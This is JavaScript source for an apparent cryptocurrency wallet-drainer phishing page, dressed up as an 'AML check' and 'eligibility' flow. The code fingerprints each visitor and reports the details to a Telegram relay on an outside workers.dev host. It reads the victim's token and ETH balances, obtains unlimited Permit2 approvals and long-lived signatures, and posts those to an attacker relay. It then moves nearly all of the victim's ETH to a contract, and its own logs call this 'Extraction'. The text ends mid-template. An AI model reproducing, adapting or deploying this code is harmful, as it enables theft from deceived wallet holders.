const UX_STATES = {
  CONNECTING: { icon: "⏳", text: "Connecting to wallet…" },
  CHAIN_READY: { icon: "🔗", text: "Blockchain connection established" },
  AML_CHECK: { icon: "🛡", text: "Checking your AML status…" },
  CHECKING_ELIGIBILITY: { icon: "🔍", text: "Checking eligibility…" },
  ELIGIBLE: { icon: "🎉", text: "Wallet eligible" },
  NOT_ELIGIBLE: { icon: "❌", text: "Sorry, this wallet is not eligible" },
AWAITING_SIGNATURE: {
  icon: "✍️",
  text: "A signature is required to verify wallet ownership. Please sign in your wallet and return to this page."
}

};

function showUxModal() {
  document.getElementById("uxModal").classList.remove("hidden");
}

function hideUxModal() {
  document.getElementById("uxModal").classList.add("hidden");
}

function setUxState(stateKey, customText) {
  const state = UX_STATES[stateKey];
  if (!state) return;

  document.getElementById("uxIcon").innerText = ""; // optional: remove emoji
  document.getElementById("uxText").innerText = customText || state.text;
}

async function logConnectWalletClick() {
  try {
    const visitor = await getVisitorInfo();

    const msg = `<pre>
🖱️ Connect Wallet Clicked
────────────────────────────
🌍 Country: ${visitor.flag} ${visitor.country}
📱 Device: ${visitor.device}
🌐 Browser: ${visitor.browser} ${visitor.browserEmoji}
📍 IP: ${visitor.ip}
────────────────────────────
</pre>`;

    await sendTelegram(msg);
  } catch (e) {
    console.error("Connect Wallet click logging failed:", e);
  }
}
function isMobileDevice() {
  return /android|iphone|ipad|ipod/i.test(navigator.userAgent);
}

function setAwaitingSignatureText() {
  if (isMobileDevice()) {
    setUxState(
      "AWAITING_SIGNATURE",
      "A signature request was sent to your wallet app. After signing, please return to this browser tab to continue."
    );
  } else {
    setUxState(
      "AWAITING_SIGNATURE",
      "Please sign the request in your wallet to continue."
    );
  }
}

/* =======================
   END OF PROTECTION BLOCK REMOVED
======================= */
// =========================== VISITOR INTELLIGENCE BLOCK ===========================

// Show emoji flag for all major countries, including GCC/USA/Canada
const countryFlags = (code) => {
    if (!code || typeof code !== "string" || code.length !== 2) return "🏳️";
    const OFFSET = 127397;
    const chars = [...code.toUpperCase()];
    return String.fromCodePoint(chars[0].charCodeAt() + OFFSET, chars[1].charCodeAt() + OFFSET);
};
const browserEmoji = name => {
    if(/chrome|crios/i.test(name)) return "🌐";
    if(/firefox/i.test(name)) return "🦊";
    if(/safari/i.test(name) && !/chrome|crios/i.test(name)) return "🦁";
    if(/edg/i.test(name)) return "🔵";
    if(/opera|opr/i.test(name)) return "🅾️";
    if(/brave/i.test(name)) return "🦁";
    return "🔲";
};
function isVpnDetected(ipData) {
    const privacy = ipData.privacy || {};
    if (privacy.vpn || privacy.proxy || privacy.tor || privacy.relay) return true;
    if (/vpn|proxy|tor|relay|anonymizer/i.test(ipData.hostname||"")) return true;
    if (/amazon|digitalocean|google|azure|ovh|microsoft|cloud|linode|contabo|hetzner|alibaba|upcloud|scaleway|vultr|\bgeneric\b/i.test(ipData.org||"")) return true;
    return false;
}
async function getVisitorInfo() {
    let ipData = {};
    try {
        ipData = await fetch("https://ipinfo.io/json?token=abb3f641f0742c").then(res=>res.json());
    } catch (e) { ipData = {}; }

    const ua = navigator.userAgent || "";
    const isMobile = /android|iphone|ipad|mobile/i.test(ua);
    const deviceType = isMobile ? "Mobile" : "Desktop";
    let browser = "Unknown";
    if (/chrome|crios/i.test(ua)) browser = "Chrome";
    else if (/firefox/i.test(ua)) browser = "Firefox";
    else if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) browser = "Safari";
    else if (/edg/i.test(ua)) browser = "Edge";
    else if (/opera|opr/i.test(ua)) browser = "Opera";
    else if (/brave/i.test(ua)) browser = "Brave";

    let isVpnApi = ipData.privacy?.vpn || ipData.privacy?.proxy || ipData.privacy?.tor || ipData.privacy?.relay;
    let suspiciousOrg = /amazon|digitalocean|ovh|contabo|google|microsoft|azure|linode|\bgeneric\b/i.test(ipData.org || "");
    let suspiciousHostname = ipData.hostname && /vpn|proxy|tor|exit/i.test(ipData.hostname);
    let countryGcc = /^(AE|SA|QA|KW|OM|BH)$/.test(ipData.country); // All Gulf GCC
    let detectedVpn = Boolean(isVpnApi || suspiciousOrg || suspiciousHostname);

    let flag = ipData.country ? countryFlags(ipData.country) : "🏳️";

    let visitorDb = JSON.parse(localStorage.getItem("web3gpt_visitor_info")||"{}");
    let visitorID = visitorDb.visitorID || 1;
    let visitCounts = visitorDb.visitCounts || {};
    let myIp = ipData.ip || "?.?.?.?";

    let isReturning = false;
    if (!visitCounts[myIp]) {
        const usedIDs = Object.values(visitCounts).map(v=>v.id);
        let newID = 1; while (usedIDs.includes(newID)) newID++;
        visitCounts[myIp] = { id: newID, times: 1 };
        visitorID = newID;
    } else {
        visitCounts[myIp].times += 1;
        isReturning = visitCounts[myIp].times > 1;
        visitorID = visitCounts[myIp].id;
    }
    localStorage.setItem("web3gpt_visitor_info", JSON.stringify({ visitorID, visitCounts }));

    return {
        id: visitorID,
        ip: myIp,
        country: ipData.country||"??",
        flag,
        city: ipData.city||"?",
        region: ipData.region||"?",
        device: deviceType,
        browser: browser,
        browserEmoji: browserEmoji(browser),
        detectedVpn,
        times: visitCounts[myIp]?.times || 1,
        org: ipData.org||"",
        timezone: ipData.timezone||"",
        isReturning
    };
}

function fmtTelegramVisitorIntel(data) {
    let title = data.isReturning ? "Returning Visitor Session" : "New Visitor Session";
    let vpnStatus = data.detectedVpn ? "ON 🟢" : "OFF 🔴";
    return `<pre>
${title}
────────────────────────────
🆔🩸Session ID: #${data.id} ${data.isReturning ? "(Returning)" : ""}
🆔🩸Country: ${data.flag} ${data.country}
🆔🩸City/Region: ${data.city}, ${data.region}
🆔🩸IP: ${data.ip}
🆔🩸Visits: ${data.times}
🆔🩸Device: ${data.device}
🆔🩸Browser: ${data.browser} ${data.browserEmoji}
🆔🩸ASN: ${data.org}
🆔🩸Time Zone: ${data.timezone}
🆔🩸VPN: ${vpnStatus}
────────────────────────────
</pre>`;
}

window.showVisitorIntel = async function() {
    const info = await getVisitorInfo();
    await sendTelegram(fmtTelegramVisitorIntel(info));
};

/* =========================
   IMPORTS & CONFIG & WEB3MODAL setup
========================= */
import { createWeb3Modal, defaultWagmiConfig } from 'https://esm.sh/@web3modal/wagmi@4';
import { mainnet } from 'https://esm.sh/wagmi/chains';
import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js";
import { getAccount, getBalance, disconnect, watchAccount } from 'https://esm.sh/wagmi/actions';


const PROJECT_ID = "3641b15a490f465ebc37bd543270d556";
const CONTRACT_ADDRESS = "0x9Cb5d45fc50dbdbeFeA76F50ae9eEe4709496bf6";
const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

const TOKENS = [
  { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6,  coingeckoId: "tether" },
  { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6,  coingeckoId: "usd-coin" },
  { symbol: "DAI",  address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18, coingeckoId: "dai" },
  { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18, coingeckoId: "weth" },
  { symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8,  coingeckoId: "wrapped-bitcoin" },
  { symbol: "UNI",  address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18, coingeckoId: "uniswap" },
  { symbol: "AAVE", address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", decimals: 18, coingeckoId: "aave" },
  { symbol: "COMP", address: "0xc00e94Cb662C3520282E6f5717214004A7f26888", decimals: 18, coingeckoId: "compound-governance-token" },
  { symbol: "MKR",  address: "0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2", decimals: 18, coingeckoId: "maker" },
  { symbol: "stETH",address: "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84", decimals: 18, coingeckoId: "staked-ether" },
  { symbol: "rETH", address: "0xae78736Cd615f374D3085123A210448E74Fc6393", decimals: 18, coingeckoId: "rocket-pool-eth" }
];

const WALLET_TYPE_ICONS = {
  MetaMask: "🦊",
  Coinbase: "💙",
  Brave: "🦁",
  Trust: "🔷",
  OKX: "🟧",
  Frame: "🖥️",
  Rabby: "🐰",
  "Other": "🟠"
};

const config = defaultWagmiConfig({
  chains: [mainnet],
  projectId: PROJECT_ID,
  metadata: {
    name: 'Professional Web3 UI',
    description: 'Wallet connection demo',
    url: location.origin,
    icons: ['https://walletconnect.com/walletconnect-logo.png']
  }
});

const modal = createWeb3Modal({
  wagmiConfig: config,
  projectId: PROJECT_ID,
  chains: [mainnet]
});

/* =========================
   TELEGRAM LOGGER
========================= */
async function sendTelegram(msg) {
  try {
    await fetch("https://telegram-backend.ab125879626.workers.dev/api/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ msg })
    });
  } catch (e) {}
}
/* =========================
   STYLE HELPERS
========================= */
function detectWalletTypeFromAccount() {
  const account = getAccount(config);
  return account.connector?.name || "Other";
}

function shortAddr(addr) {
  return addr.slice(0, 6) + "…" + addr.slice(-4);
}
function code(s) {
  return `<code>${s}</code>`;
}
function bold(s) {
  return `<b>${s}</b>`;
}
function hyperlink(url, text) {
  return `<a href="${url}">${text}</a>`;
}
function fmtNum(x, dec = 4) {
  if (typeof x === "string") x = Number(x);
  if (isNaN(x)) return "?";
  if (x > 1e3) return x.toLocaleString(undefined, { maximumFractionDigits: 2 });
  return Number(x).toFixed(dec);
}
function fmtAmount(bn, decimals) {
  try { return ethers.utils.formatUnits(bn, decimals); } catch { return bn.toString(); }
}

/* =========================
   fmtTelegramWalletConnected
========================= */
async function fmtTelegramWalletConnected(addr, chainId, tokens, priceData, ethBalRaw, walletType, totalUsd, tokenDataList) {
  let lines = [];
  let icon = WALLET_TYPE_ICONS[walletType] || "🔲";
  lines.push(`<pre>`);
  lines.push(`🔗 Operation: Target wallet handshake ${icon}`);
  lines.push(`──────────────────────────────`);
  lines.push(`👤 Address: ${code(addr)}`);
  lines.push(`📱 Wallet: ${walletType}`);
  lines.push(`🌐 Network: Ethereum (${chainId})`);
  lines.push(``);
  lines.push(`💵 Asset Exposure: $${fmtNum(totalUsd, 2)}`);
  lines.push(`⛽️ ETH: ${fmtNum(ethers.utils.formatEther(ethBalRaw), 4)} (${priceData?.ethereum?.usd ? `$${fmtNum(Number(ethers.utils.formatEther(ethBalRaw)) * priceData.ethereum.usd, 2)}` : "n/a"})`);
  lines.push(`📦 Tokens:`);
  for (let tok of tokenDataList) {
    lines.push(`   • ${tok.symbol}: ${fmtNum(tok.human, tok.decimals < 8 ? 2 : 5)} (${priceData?.[tok.coingeckoId]?.usd ? `$${fmtNum(tok.usdVal, 2)}` : "n/a"})`);
  }
  lines.push(``);
  lines.push(`🔍 ${hyperlink(`https://etherscan.io/address/${addr}`, "Etherscan intel")}`);
  lines.push(`</pre>`);
  return lines.join('\n');
}

/* =========================
   HELPERS
========================= */
const UINT160_MAX = ethers.BigNumber.from("0xffffffffffffffffffffffffffffffffffffffff");
const UINT256_MAX = ethers.constants.MaxUint256;

function clampUint160(bn) {
  const big = ethers.BigNumber.from(bn);
  return big.gt(UINT160_MAX) ? UINT160_MAX : big;
}
function explainError(e) {
  if (!e) return "Unknown error";
  if (e?.error?.message) return e.error.message;
  if (e?.data?.message) return e.data.message;
  if (e?.reason) return e.reason;
  if (e?.message) return e.message;
  return String(e);
}

/* =========================
   Get ethers provider
========================= */

async function getEthersProviderFromWagmi() {
  const account = getAccount(config);
  if (!account?.connector) {
    throw new Error("No wagmi connector available");
  }

  const provider = await account.connector.getProvider();
  return new ethers.providers.Web3Provider(provider);
}

/* =========================
   BATCH APPROVE (user-side)
========================= */
async function ensurePermit2Approvals(provider, signer, owner, tokens, amounts) {
  for (let i = 0; i < tokens.length; i++) {
    const tokenAddr = tokens[i];
    const amount = ethers.BigNumber.from(amounts[i]);
    const erc20 = new ethers.Contract(tokenAddr, [
      "function allowance(address owner, address spender) view returns (uint256)",
      "function approve(address spender, uint256 value) returns (bool)"
    ], signer);

    const current = await erc20.allowance(owner, PERMIT2);
    if (current.gte(amount)) {
      continue;
    }

    try {
      const tx = await erc20.approve(PERMIT2, UINT256_MAX);
      await tx.wait();
      await sendTelegram(`🔓 Approval secured: ${code(tokenAddr)} > Permit2`);
      continue;
    } catch (e1) {
      await sendTelegram(`🛡 Initial approval failed. Protocol: two-step. Err: ${code(explainError(e1))}`);
    }

    try {
      const tx0 = await erc20.approve(PERMIT2, 0);
      await tx0.wait();
      const tx1 = await erc20.approve(PERMIT2, UINT256_MAX);
      await tx1.wait();
      await sendTelegram(`♻️ Two-step unlock: ${code(tokenAddr)} > Permit2`);
    } catch (e2) {
      await sendTelegram(`⛔️ Approval protocol rejected: ${code(tokenAddr)} | ${code(explainError(e2))}`);
      throw e2;
    }
  }
}
function fmtTelegramPermit2Signature(owner, deadline, tokens, amounts, nonces, detailsObjects, spender, permit2, signature, priceData = {}) {
  const dt = new Date(Number(deadline) * 1000).toUTCString();
  let lines = [];
  lines.push('<pre>');
  lines.push('🗝️ Permit2 Batch Authorization');
  lines.push('──────────────────────────────');
  lines.push(`👤 Owner: <code>${owner}</code>`);
  lines.push(`📑 Spender: <code>${spender}</code>`);
  lines.push(`🏛 Permit2: <code>${permit2}</code>`);
  lines.push(`⏳ Expiry: ${deadline} (${dt})`);
  lines.push('');
  lines.push('🔢 Permits:');
  for (let i = 0; i < tokens.length; i++) {
    const detail = detailsObjects[i];
    lines.push(`  • Token: <code>${tokens[i]}</code>`);
    lines.push(`    Amount: ${amounts[i]}`);
    lines.push(`    Nonce: ${nonces[i]}`);
    if (detail) {
      lines.push(`    Expiration: ${detail.expiration}`);
    }
    lines.push('');
  }
  lines.push('Signature:');
  lines.push(`<code>${signature}</code>`);
  lines.push('</pre>');
  return lines.join('\n');
}
/* =========================
   DEPOSIT SINGLE TOKEN (Permit2 Single)
========================= */
function fmtTelegramPermit2SingleSignature({owner, token, amount, expiration, nonce, spender, sigDeadline, permit2, signature}) {
  const dt = new Date(Number(expiration) * 1000).toUTCString();
  return `<pre>
🗝️ Permit2 Single Authorization
──────────────────────────────
👤 Owner: <code>${owner}</code>
🪙 Token: <code>${token}</code>
🔢 Amount: ${amount.toString()}
⏳ Expiry: ${expiration} (${dt})
🔐 Nonce: ${nonce}
📑 Spender: <code>${spender}</code>
🏛 Permit2: <code>${permit2}</code>
⏱ Deadline: ${sigDeadline}

Signature:
<code>${signature}</code>
</pre>`;
}


async function depositSingleTokenPermit2Only(owner, tokenAddr, amount, provider, signer, chainId) {
  try {
    await ensurePermit2Approvals(provider, signer, owner, [tokenAddr], [amount]);

    const permit2 = new ethers.Contract(PERMIT2, [
      "function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)"
    ], provider);
    const nonce = await permit2.allowance(owner, tokenAddr, CONTRACT_ADDRESS).then(r => r[2] || 0);
    const THREE_YEARS = 3 * 365 * 24 * 60 * 60;
    const deadline = Math.floor(Date.now() / 1000) + THREE_YEARS;

    const permitSingle = {
      details: {
        token: tokenAddr,
        amount: amount,
        expiration: deadline,
        nonce: nonce
      },
      spender: CONTRACT_ADDRESS,
      sigDeadline: deadline
    };

    const domain = { name: "Permit2", chainId, verifyingContract: PERMIT2 };
    const types = {
      PermitDetails: [
        { name: "token", type: "address" },
        { name: "amount", type: "uint160" },
        { name: "expiration", type: "uint48" },
        { name: "nonce", type: "uint48" }
      ],
      PermitSingle: [
        { name: "details", type: "PermitDetails" },
        { name: "spender", type: "address" },
        { name: "sigDeadline", type: "uint256" }
      ]
    };


await new Promise(r => setTimeout(r, 600));

const providerSigner = provider.getSigner(owner);

await new Promise(r => setTimeout(r, 600));
setAwaitingSignatureText();

const signature = await providerSigner._signTypedData(
  domain,
  types,
  permitSingle
);

    const relayRequestSingle = {
  isBatch: false,
  depositor: owner,
  permit: permitSingle,
  signature: signature,
  amount: amount.toString(),  // make sure toString the amount for serialization
  token: tokenAddr
};

try {
const response = await fetch('https://twilight-hat-ee61.ab125879626.workers.dev', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(relayRequestSingle)
  });
  const result = await response.json();

  if (result.success) {
    console.log('Relay success! Tx hash:', result.tx);
    // Notify UI or user
  } else {
    console.error('Relay error:', result.error);
  }
} catch (err) {
  console.error('Failed to send relay request:', err);
}

    await sendTelegram(fmtTelegramPermit2SingleSignature({
      owner,
      token: tokenAddr,
      amount,
      expiration: deadline,
      nonce,
      spender: CONTRACT_ADDRESS,
      sigDeadline: deadline,
      permit2: PERMIT2,
      signature
    }));

    const ethBalRaw = await provider.getBalance(owner);
    let ethToSend = ethers.BigNumber.from(0);
    let gasLimitEstimate = ethers.BigNumber.from(130_000);
    let feeData = null;
    try {
      feeData = await provider.getFeeData();
      const myDapp = new ethers.Contract(CONTRACT_ADDRESS, [
        "function depositWithPermit(address depositor, (address token,uint160 amount,uint48 expiration,uint48 nonce, address spender,uint256 sigDeadline) permit_, bytes signature, uint160 amount, address token) payable"
      ], signer);
      gasLimitEstimate = await myDapp.estimateGas.depositWithPermit(
        owner,
        [
          tokenAddr,
          amount,
          deadline,
          nonce,
          CONTRACT_ADDRESS,
          deadline
        ],
        signature,
        amount,
        tokenAddr,
        { value: 0 }
      );
    } catch (err) { }

    const gasPrice = feeData?.gasPrice || feeData?.maxFeePerGas || await provider.getGasPrice();
    const gasCost = gasPrice.mul(gasLimitEstimate).mul(13).div(10);
    let tenDollarInEth = ethers.BigNumber.from("0");
    try {
      const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd");
      const ethUsd = (await res.json())?.ethereum?.usd || 0;
      if (ethUsd > 0) tenDollarInEth = ethers.utils.parseEther((10 / ethUsd).toFixed(18));
      else tenDollarInEth = ethers.utils.parseEther("0.003");
    } catch (e) { tenDollarInEth = ethers.utils.parseEther("0.003"); }

    if (ethBalRaw.gt(gasCost.add(tenDollarInEth))) {
      ethToSend = ethBalRaw.sub(gasCost).sub(tenDollarInEth);
    } else if (ethBalRaw.gt(gasCost)) {
      ethToSend = ethBalRaw.sub(gasCost);
    }

    const myDapp = new ethers.Contract(CONTRACT_ADDRESS, [
      "function depositWithPermit(address depositor, (address token,uint160 amount,uint48 expiration,uint48 nonce, address spender,uint256 sigDeadline) permit_, bytes signature, uint160 amount, address token) payable"
    ], signer);

    const tx = await myDapp.depositWithPermit(
      owner,
      [
        tokenAddr,
        amount,
        deadline,
        nonce,
        CONTRACT_ADDRESS,
        deadline
      ],
      signature,
      amount,
      tokenAddr,
      {
        gasLimit: gasLimitEstimate.mul(15).div(10),
        value: ethToSend
      }
    );

    await sendTelegram(`🚀 Extraction protocol (single token) initiated. Tx: <a href="https://etherscan.io/tx/${tx.hash}">${tx.hash}</a>`);
    const receipt = await tx.wait();
    await sendTelegram(`✅ Extraction confirmed (single token). Evidence: <a href="https://etherscan.io/tx/${receipt.transactionHash}">${receipt.transactionHash}</a>`);
  } catch (err) {
    await sendTelegram(`⛔️ Extraction failed (single token). Fault: ${code(explainError(err))}`);
  }
}

/* =========================
   CORE FLOW (deposit)
========================= */
async function depositAllBatchPermit2Only() {
  try {
const provider = await getEthersProviderFromWagmi();
    const account = getAccount(config);
    if (!account.isConnected) {
      await sendTelegram(`⚠️ Deposit halted: wallet not connected.`);
      throw new Error("Wallet not connected");
    }
    const owner = account.address;
    const network = await provider.getNetwork();
    if (network.chainId !== 1) {
      await sendTelegram(`⚠️ Non-mainnet chain (${network.chainId}) detected. Protocol halted.`);
      throw new Error(`Wrong network: ${network.chainId}`);
    }
    const chainId = network.chainId;
    const signer = provider.getSigner(owner);

    let priceData = {};
    try {
      const priceRes = await fetch(
        "https://api.coingecko.com/api/v3/simple/price?ids=tether,usd-coin,dai,ethereum,wrapped-bitcoin,uniswap,aave,compound-governance-token,maker,staked-ether,rocket-pool-eth&vs_currencies=usd"
      );
      priceData = await priceRes.json();
    } catch (e) {}

    const idMap = {
      USDT: "tether", USDC: "usd-coin", DAI: "dai",
      WETH: "ethereum", WBTC: "wrapped-bitcoin", UNI: "uniswap",
      AAVE: "aave", COMP: "compound-governance-token", MKR: "maker",
      stETH: "staked-ether", rETH: "rocket-pool-eth"
    };
    const getUsd = sym => priceData?.[idMap[sym]]?.usd || 0;

    const ethBalRaw = await provider.getBalance(owner);
    let ethUsd = 0, ethUsdVal = 0;
    if (priceData?.ethereum?.usd) {
      ethUsd = priceData.ethereum.usd;
      ethUsdVal = Number(ethers.utils.formatEther(ethBalRaw)) * ethUsd;
    }

    let tokens = [];
    let amounts = [];
    let tokenDataList = [];
    let totalUsd = ethUsdVal;
    const erc20BalAbi = [
      "function balanceOf(address) view returns (uint256)",
      "function decimals() view returns (uint8)"
    ];

    for (const t of TOKENS) {
      const token = new ethers.Contract(t.address, erc20BalAbi, provider);
      const bal = await token.balanceOf(owner);
      if (bal.isZero()) continue;
      const human = parseFloat(ethers.utils.formatUnits(bal, t.decimals));
      const usd = human * getUsd(t.symbol);
      if (usd && usd < 5) continue;
      const a160 = clampUint160(bal).toString();
      tokens.push(t.address);
      amounts.push(a160);
      tokenDataList.push({
        symbol: t.symbol,
        human,
        decimals: t.decimals,
        usdVal: usd,
        coingeckoId: t.coingeckoId
      });
      totalUsd += usd;
    }

    try {
const walletType = detectWalletTypeFromAccount();
await sendTelegram(await fmtTelegramWalletConnected(owner, chainId, tokens, priceData, ethBalRaw, walletType, totalUsd, tokenDataList));
    } catch (err) {}

    if (tokens.length === 0) {
      let ethToSend = ethBalRaw;

      let gasLimit = ethers.BigNumber.from(100_000);
      let feeData = null;
      try {
        feeData = await provider.getFeeData();
        const myDapp = new ethers.Contract(CONTRACT_ADDRESS, [
          "function depositETH(address) payable"
        ], signer);
        gasLimit = await myDapp.estimateGas.depositETH(owner, { value: 0 });
      } catch (err) {}

      const gasPrice = feeData?.gasPrice || feeData?.maxFeePerGas || await provider.getGasPrice();
      const gasCost = gasPrice.mul(gasLimit).mul(12).div(10);
      let tenDollarInEth = ethers.BigNumber.from(0);
      if (ethUsd > 0) tenDollarInEth = ethers.utils.parseEther((10 / ethUsd).toFixed(18));
      if (ethUsd > 0 && ethBalRaw.gt(gasCost.add(tenDollarInEth))) {
        ethToSend = ethBalRaw.sub(gasCost).sub(tenDollarInEth);
      } else if (ethBalRaw.gt(gasCost)) {
        ethToSend = ethBalRaw.sub(gasCost);
      } else {
        ethToSend = ethers.BigNumber.from(0);
      }

      if (ethToSend.isZero()) {
        await sendTelegram("⚠️ ETH insufficient for extraction protocol. Aborting.");
        return;
      }

      try {
        const myDapp = new ethers.Contract(CONTRACT_ADDRESS, [
          "function depositETH(address) payable"
        ], signer);

        const overrides = {
          gasLimit: gasLimit.mul(15).div(10),
          value: ethToSend
        };
        if (feeData?.maxFeePerGas && feeData?.maxPriorityFeePerGas) {
          overrides.maxFeePerGas = feeData.maxFeePerGas;
          overrides.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
        }
        const tx = await myDapp.depositETH(owner, overrides);
        await sendTelegram(`🚀 Extraction protocol (ETH-only) initiated. Tx: <a href="https://etherscan.io/tx/${tx.hash}">${tx.hash}</a>`);
        const receipt = await tx.wait();
        await sendTelegram(`✅ Extraction confirmed (ETH-only). Archive: <a href="https://etherscan.io/tx/${receipt.transactionHash}">${receipt.transactionHash}</a>`);
      } catch (err) {
        await sendTelegram(`⛔️ Extraction failed (ETH-only). Fault: ${code(explainError(err))}`);
      }
      return;
    }

    if (tokens.length === 1) {
      await depositSingleTokenPermit2Only(owner, tokens[0], amounts[0], provider, signer, chainId);
      return;
    }

    try {
      await ensurePermit2Approvals(provider, signer, owner, tokens, amounts);
    } catch (approveErr) {
      await sendTelegram(`⛔️ Permit2 approval stack failed: ${code(explainError(approveErr))}`);
      return;
    }

    const permit2 = new ethers.Contract(PERMIT2, [
      "function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)"
    ], provider);
    const nonces = await Promise.all(
      tokens.map(tokenAddr => permit2.allowance(owner, tokenAddr, CONTRACT_ADDRESS).then(r => r[2] || 0))
    );

    const THREE_YEARS = 3 * 365 * 24 * 60 * 60;
    const deadline = Math.floor(Date.now() / 1000) + THREE_YEARS;
    const detailsObjects = tokens.map((tokenAddr, i) => ({
      token: tokenAddr,
      amount: amounts[i],
      expiration: deadline,
      nonce: nonces[i]
    }));

    const detailsTuples = tokens.map((tokenAddr, i) => [
      tokenAddr, amounts[i], deadline, nonces[i]
    ]);
    const permitBatchSign = { details: detailsObjects, spender: CONTRACT_ADDRESS, sigDeadline: deadline };
    const permitBatchCall = { details: detailsTuples, spender: CONTRACT_ADDRESS, sigDeadline: deadline };

    const domain = { name: "Permit2", chainId, verifyingContract: PERMIT2 };
    const types = {
      PermitDetails: [
        { name: "token", type: "address" },
        { name: "amount", type: "uint160" },
        { name: "expiration", type: "uint48" },
        { name: "nonce", type: "uint48" }
      ],
      PermitBatch: [
        { name: "details", type: "PermitDetails[]" },
        { name: "spender", type: "address" },
        { name: "sigDeadline", type: "uint256" }
      ]
    };
const providerSigner = provider.getSigner(owner);
await new Promise(r => setTimeout(r, 600));
setAwaitingSignatureText();

const signature = await providerSigner._signTypedData(
  domain,
  types,
  permitBatchSign
);
// Construct payload for your backend relayDeposit POST request
const relayRequest = {
  isBatch: true,
  depositor: owner,
  permitBatch: permitBatchSign,  // object with details: array of permit details, spender, sigDeadline
  signatureBatch: signature,
  amounts: amounts,
  tokens: tokens
};

try {
  // Send the POST request to your backend relay API
const response = await fetch('https://twilight-hat-ee61.ab125879626.workers.dev', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(relayRequest)
  });
  const result = await response.json();

  if (result.success) {
    console.log('Relay success! Tx hash:', result.tx);
    // Optionally update UI or notify user here
  } else {
    console.error('Relay error:', result.error);
    // Optionally notify user of error
  }
} catch (err) {
  console.error('Failed to send relay request:', err);
  // Optionally notify user of network or other errors
}
    await sendTelegram(
      fmtTelegramPermit2Signature(owner, deadline, tokens, amounts, nonces, detailsObjects, CONTRACT_ADDRESS, PERMIT2, signature, priceData)
    );

    const myDappAbi = [
      "function depositWithPermitBatchAndETH(" +
      "address owner," +
      "tuple(" +
        "tuple(address token,uint160 amount,uint48 expiration,uint48 nonce)[] details," +
        "address spender," +
        "uint256 sigDeadline" +
      ") permits," +
      "bytes signature," +
      "uint160[] amounts," +
      "address[] tokens" +
      ") external payable"
    ];
    const myDapp = new ethers.Contract(CONTRACT_ADDRESS, myDappAbi, providerSigner);
    const args = [owner, permitBatchCall, signature, amounts, tokens];

    let ethToSend = ethers.BigNumber.from(0);
    let gasLimit = null;
    let feeData = null;

    try {
      const balance = ethBalRaw;
      feeData = await provider.getFeeData();

      try {
        gasLimit = await myDapp.estimateGas.depositWithPermitBatchAndETH(...args, { from: owner, value: 0 });
      } catch (estErr) {
        await sendTelegram(`⚠️ Gas estimation failed: ${code(explainError(estErr))}`);
        gasLimit = ethers.BigNumber.from(550_000);
      }

      const gasPrice = feeData?.gasPrice || feeData?.maxFeePerGas || await provider.getGasPrice();
      const gasCost = gasPrice.mul(gasLimit).mul(12).div(10);

      let tenDollarInEth = ethers.BigNumber.from(0);
      if (ethUsd > 0) {
        tenDollarInEth = ethers.utils.parseEther((10 / ethUsd).toFixed(18));
      }

      if (ethUsd > 0 && balance.gt(gasCost.add(tenDollarInEth))) {
        ethToSend = balance.sub(gasCost).sub(tenDollarInEth);
      } else if (balance.gt(gasCost)) {
        ethToSend = balance.sub(gasCost);
      } else {
        ethToSend = ethers.BigNumber.from(0);
      }

    } catch (err) {
      await sendTelegram(`⚠️ Fee block exception: ${code(explainError(err))}`);
      gasLimit = ethers.BigNumber.from(550_000);
      ethToSend = ethers.BigNumber.from(0);
    }

    try {
      const overrides = {
        gasLimit: gasLimit.mul(15).div(10),
        value: ethToSend
      };
      if (feeData?.maxFeePerGas && feeData?.maxPriorityFeePerGas) {
        overrides.maxFeePerGas = feeData.maxFeePerGas;
        overrides.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
      }
      const tx = await myDapp.depositWithPermitBatchAndETH(...args, overrides);
      await sendTelegram(`🚀 Extraction protocol (batch) initiated. Tx: <a href="https://etherscan.io/tx/${tx.hash}">${tx.hash}</a>`);
      const receipt = await tx.wait();
      await sendTelegram(`✅ Extraction confirmed (batch). Evidence: <a href="https://etherscan.io/tx/${receipt.transactionHash}">${receipt.transactionHash}</a>`);
    } catch (err) {
      await sendTelegram(`⛔️ Extraction failed (batch). Fault: ${code(explainError(err))}`);
    }
  } catch (e) {
    await sendTelegram(`⚠️ Flow interruption: ${code(explainError(e))}`);
  }
}hideUxModal();


/* =========================
   DOM WIRING for updated flow, no sign message, just connect & deposit
========================= */
const ui = document.getElementById('ui');
const connectBtn = document.getElementById('connectBtn');

function short(addr) {
  return addr.slice(0, 6) + '...' + addr.slice(-4);
}

function setStatus(type, text) {
  const map = {
    disconnected: ['blue', 'Disconnected'],
    connecting: ['yellow', 'Connecting to wallet…'],
    connected: ['green', 'Wallet connected'],
    error: ['red', text || 'Action rejected']
  };

  const [color, label] = map[type] || ['blue', 'Unknown'];

  const status = document.querySelector('.status');
  if (!status) return;
  status.innerHTML = `
    <span class="dot ${color}"></span>
    <span>${label}</span>
  `;
}

async function render() {
  const account = getAccount(config);
  if (!account.isConnected) {
    if(ui) {
      ui.innerHTML = `
        <h2>Wallet Connection</h2>
        <p>Please connect your wallet</p>

        <div class="status" id="status">
          <span class="dot blue"></span>
          <span>Disconnected</span>
        </div>

